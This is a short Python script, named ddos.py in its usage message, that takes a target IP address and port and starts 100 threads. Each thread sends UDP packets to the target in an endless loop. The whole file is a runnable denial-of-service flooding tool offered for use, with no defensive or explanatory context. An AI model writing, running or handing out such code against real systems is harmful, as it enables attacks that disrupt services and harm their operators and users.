import socket
import threading
import sys


if len(sys.argv) < 3:
    print("Usage: python ddos.py <IP> <PORT>")
    sys.exit()

target_ip = sys.argv[1]  
target_port = int(sys.argv[2])  

num_threads = 100  
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"AttackPacket", (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port}")
            s.close()
        except:
            pass


for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
